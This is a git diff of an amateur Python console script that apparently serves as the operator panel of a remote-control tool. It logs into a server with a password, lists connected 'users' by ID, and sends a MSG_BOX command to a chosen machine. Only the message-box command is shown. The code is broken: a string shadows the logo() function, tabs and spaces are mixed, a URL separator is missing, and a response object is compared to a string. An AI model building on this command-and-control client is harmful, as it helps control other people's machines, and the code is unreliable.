@@ -3,9 +3,18 @@ import os
 import sys
 import time
 from colorama import Fore, Back, init
+#colorama init
 init(autoreset=True)
+#functions
 def clear():
     os.system('clear')
+def logo():
+	print(logo)
+	print(Fore.GREEN + "[!] - Server: " + url)
+def comandhelp():
+    print('1. MSG_BOX')
+
+#logo
 logo = Fore.MAGENTA + '''
 ░██████╗██╗░░██╗██╗███╗░░██╗░█████╗░██████╗░██╗░░░██╗██████╗░░█████╗░████████╗███╗░░██╗███████╗████████╗
 ██╔════╝██║░░██║██║████╗░██║██╔══██╗██╔══██╗██║░░░██║██╔══██╗██╔══██╗╚══██╔══╝████╗░██║██╔════╝╚══██╔══╝
@@ -56,6 +65,21 @@ else:
 	print(Fore.GREEN + '[!] - URL set ' + url)
 	password = input(Fore.YELLOW + 'Enter your password: ')
 	userslist = requests.get(url + 'getusers.php?password=' + password)
-	clear()
-	print(logo)
-	print(userslist)
+	if(userslist == 'password error!'):
+		print(Fore.RED  + 'Password error')
+		exit()
+	else:
+		clear()
+		print(logo)
+		print(Fore.GREEN + "[!] - Server: " + url)
+		print(userslist)
+		id = input('Enter user ID: ')
+		clear()
+		logo()
+		print(Fore.GREEN + 'User ' + id + ' set')
+		comandhelp()
+		command = input('Enter your command: ')
+		if(command == "MSG_BOX"):
+    		content = input('Enter content: ')
+			requests.get(url + 'sendcommand.php?password=' + password + '&id=' + id + 'type=msg_box&content=' + content)
+			print(Fore.GREEN + 'comand send!')
